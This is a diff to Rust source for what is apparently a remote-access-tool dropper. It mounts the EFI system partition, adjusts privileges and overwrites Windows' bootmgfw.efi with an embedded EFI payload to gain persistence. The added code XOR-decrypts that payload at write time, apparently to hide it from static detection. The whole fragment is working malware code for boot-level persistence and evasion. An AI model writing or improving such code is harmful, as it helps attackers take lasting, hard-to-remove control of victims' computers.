@@ -1,10 +1,10 @@
 use std::ffi::c_void;
 use std::io::Write;
 use std::path::PathBuf;
-use std::{fs, ptr};
+use std::{fs, io, ptr};
 
 use rat_common::utils::DropGuard;
-use rat_dropper::{EFI_APPLICATION, ESP_GUID};
+use rat_dropper::{EFI_APPLICATION_ENCRYPTED, EFI_APPLICATION_KEY, ESP_GUID};
 use windows_sys::Win32::Foundation::{
     CloseHandle, ERROR_NO_MORE_FILES, ERROR_SUCCESS, GetLastError, HANDLE, INVALID_HANDLE_VALUE,
     LUID, MAX_PATH,
@@ -25,6 +25,15 @@ use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken}
 use windows_sys::Win32::System::WindowsProgramming::GetFirmwareEnvironmentVariableW;
 use windows_sys::core::GUID;
 use windows_sys::w;
+
+fn write_decrypted_payload(f: &mut fs::File) -> io::Result<()> {
+    for (i, c) in EFI_APPLICATION_ENCRYPTED.iter().enumerate() {
+        let m = c ^ EFI_APPLICATION_KEY[i % EFI_APPLICATION_KEY.len()];
+        f.write_all(&[m])?;
+    }
+
+    Ok(())
+}
 
 fn adjust_privileges() -> bool {
     let mut token = HANDLE::default();
@@ -200,7 +209,7 @@ fn mount_esp_and_setup_persistence() -> bool {
 
             match fs::File::create(&bootmgfw) {
                 Ok(mut f) => {
-                    if let Err(e) = f.write_all(EFI_APPLICATION) {
+                    if let Err(e) = write_decrypted_payload(&mut f) {
                         eprintln!("Failed to write EFI application to bootmgfw.efi: {e}");
                         drop(f);
 
